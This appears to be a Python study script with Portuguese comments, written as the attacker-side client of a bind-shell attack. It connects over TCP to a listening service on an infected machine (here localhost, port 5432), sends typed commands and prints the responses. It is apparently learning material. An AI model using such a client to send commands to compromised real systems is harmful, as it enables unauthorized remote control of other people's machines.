# ATAQUE QUE ATACANTE SE CONECTA DENTRO DA MAQUINA > SHELLBIND (INFECTA A MAQUINA E RODA SERVIÇO QUE PODE SER CONSULTADO)
#import subprocess # PYTHON NO TERMINAL
""" -  especifica qual porta (serv, porta) > portas abaixo de 1024 precisam de acesso >administrativo< para serem abertas
    -  porta acima de 1024 abrem para qualquer processo
    -  estabelecer conexão (DNS OU IP/TCP OU UDP)
"""
from socket import * #ABRE PORTAS E SERVIÇOS DE REDE (ATACANTE/VITIMA - VITIMA/ATACANTE)
servidor = '127.0.0.1'
porta = 5432
conexao = socket(AF_INET, SOCK_STREAM) #    TCP

conexao.connect((servidor, porta)) #PODE PASSAR MAIS SERVIDORES POR ISSO 2x()
resp = 'S'

while resp == 'S':
    msg_enviada = bytes(input('Qual o seu comando: '), 'utf-8') #CONVERTER PARA BYTES PQ NAO ENTENDE TEXTO
    conexao.send(msg_enviada)
    resposta = conexao.recv(1024) #DELIMITAR O TAMANHO
    print('Dados recebidos: ', resposta)

    resp = input('Digite S para continuar e N para terminar: ')
conexao.close()